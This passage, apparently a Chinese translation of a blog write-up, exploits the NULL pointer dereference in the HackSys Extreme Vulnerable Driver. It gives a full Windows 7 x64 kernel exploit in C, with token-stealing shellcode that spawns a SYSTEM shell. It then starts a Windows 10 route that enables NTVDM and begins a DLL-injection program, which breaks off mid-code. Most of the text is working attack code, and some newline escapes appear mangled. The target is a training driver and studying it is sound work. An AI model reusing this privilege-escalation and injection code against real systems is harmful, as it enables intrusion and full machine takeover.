        true,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[!] FATAL: Error spawning cmd.exen");
        return 0;
    }
    *(DWORD *)((char *)shellcode + 27) = pi.dwProcessId;
接下来，将我们的Shellcode复制0x100，准备好被调用：
    memcpy((void*)0x100, shellcode, sizeof(shellcode));
结合之后，我们最终的漏洞利用代码如下：
    #include "stdafx.h"
    #define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
    typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
        _In_    HANDLE    ProcessHandle,
        _Inout_ PVOID     *BaseAddress,
        _In_    ULONG_PTR ZeroBits,
        _Inout_ PSIZE_T   RegionSize,
        _In_    ULONG     AllocationType,
        _In_    ULONG     Protect
        );
    char shellcode[256] = {
        0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25,
        0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x10, 0x02, 0x00,
        0x00, 0x81, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x41, 0x41, 0x41,
        0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00,
        0x48, 0x2d, 0x88, 0x01, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89,
        0xc3, 0x83, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x04, 0x74, 0x0f,
        0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2d, 0x88,
        0x01, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x08, 0x02,
        0x00, 0x00, 0x48, 0x89, 0x8b, 0x08, 0x02, 0x00, 0x00, 0x5f,
        0x5e, 0x59, 0x5b, 0x58, 0xc3, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    };
    int main()
    {
        printf("HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE Windows 7 x64 exploitnt@_xpn_nn");
        ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");
        PVOID memAddr = (PVOID)1;
        SIZE_T regionSize = 4096;
        char exploit[1024];
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(STARTUPINFO));
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        printf("[*] Mapping NULL page via ZwAllocateVirtualMemory()n");
        NTSTATUS alloc = _ZwAllocateVirtualMemory(
            GetCurrentProcess(),
            &memAddr,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (alloc != 0) {
            printf("[!] Error mapping memoryn");
            return 0;
        }
        printf("[*] Success, memory mappedn");
        printf("[*] Opening handle to device drivern");
        HANDLE driverHandle = CreateFileA(
            "\\.\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (driverHandle == INVALID_HANDLE_VALUE) {
            printf("[!] Error opening handlen");
            return 0;
        }
        printf("[*] Handle opened successfullyn");
        printf("[*] Spawning a new cmd.exe processn");
        si.cb = sizeof(STARTUPINFOA);
        if (!CreateProcessA(
            NULL,
            (LPSTR)"cmd.exe",
            NULL,
            NULL,
            true,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            printf("[!] FATAL: Error spawning cmd.exen");
            return 0;
        }
        printf("[*] cmd.exe spawnedn");
        Sleep(1000);
        printf("[*] Updating our shellcode to search for PID %dn", pi.dwProcessId);
        *(DWORD *)((char *)shellcode + 27) = pi.dwProcessId;
        printf("[*] Setting Callback() pointer at 0x08 to point to shellcoden");
        *(unsigned long long*)0x8 = 0x100;
        printf("[*] Copying shellcode to 0x100n");
        memcpy((void*)0x100, shellcode, sizeof(shellcode));
        printf("[*] Sending IOCTL to trigger exploitn");
        memset(exploit, 'A', sizeof(exploit));
        DeviceIoControl(
            driverHandle,
            HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
            exploit,
            sizeof(exploit),
            NULL,
            0,
            NULL,
            NULL
        );
        printf("[*] Done, enjoy your new system shell :)n");
        return 0;
    }
最后，成功运行：
在Windows 7成功利用漏洞之后，我们开始研究Windows 10。
## Windows 10漏洞利用
Windows在新版本中，引入了安全保护，防止用户进程映射NULL页，因此我们在上面的例子中所进行的操作就无法实现了。我们必须寻找一种替代方案，这时，NTVDM和NT虚拟DOS主机映入我们的脑海。  
NTVDM是一个Windows 10
x86上的可选功能，用于支持16位应用程序。为了运行16位应用程序，系统将会启动名为NTVDM.exe的进程，并会映射NULL页。我之前在我关于WARBIRD（
 ）的帖子中利用过这一漏洞，今天我们将再次利用。  
为了利用NTVDM.exe映射的NULL页，我们将在进程中注入一个DLL，并复制我们的Shellcode。但是，利用这个漏洞时需要注意一些事项：  
1、NTVDM子系统默认是禁用的；  
2、需要管理员账户才可以启用此功能。  
我们在测试机器上用以下命令设置NTVDM：  
fondue /enable-feature:ntvdm /hide-ux:all  
现在，如果我们运行一个16位的应用程序，比如debug.exe，我们将看到NTVDM.exe进程启动：  
接下来，我们需要NTVDM加载我们得漏洞。为此，我们将会使用典型的VirtualAllocEx/WriteProcessMemory/CreateRemoteThread技术来加载DLL。我正在计划写一篇关于进程注入的文章，因此在这里并不会过多介绍这一方法的细节。而我们注入的内容可以在下面看到，此前有一篇相关的博客文章，感兴趣的话可以阅读： 。
    #include "stdafx.h"
    void PrintUsage(void) {
        printf("Windows NTVDM DLL Injectionn");
        printf("Created by @_xpn_n");
    }
    int main(int argc, char **argv)
    {
        int pid = 0;
        HANDLE pHandle;
        SIZE_T written = 0;
        void *destMem, *loadLibrary;
        char currentDir[MAX_PATH];
        char dllPath[MAX_PATH];
        PrintUsage();
        if (argc != 2) {
            printf("Usage: %s NTVDM_PIDn");
            printf("Note: NTVDM can be launched by executing debug.exenn");
            return 1;
        }
        pid = atoi(argv[1]);
        if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == NULL) {
            printf("[X] OpenProcess() failed, make sure PID is for NTVDM processn");
            return 2;
        }
        else {
            printf("[.] OpenProcess() completed, handle: %dn", pHandle);
        }
        if ((destMem = VirtualAllocEx(pHandle, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL) {
            printf("[X] VirtualAllocEx() failed to allocate memory in processn");
            return 3;
        }
        else {
            printf("[.] VirtualAllocEx() allocated memory at %pn", destMem);
        }
        if ((loadLibrary = (void *)GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA")) == NULL) {
            printf("[X] GetProcAddress() failed to find address of LoadLibrary()n");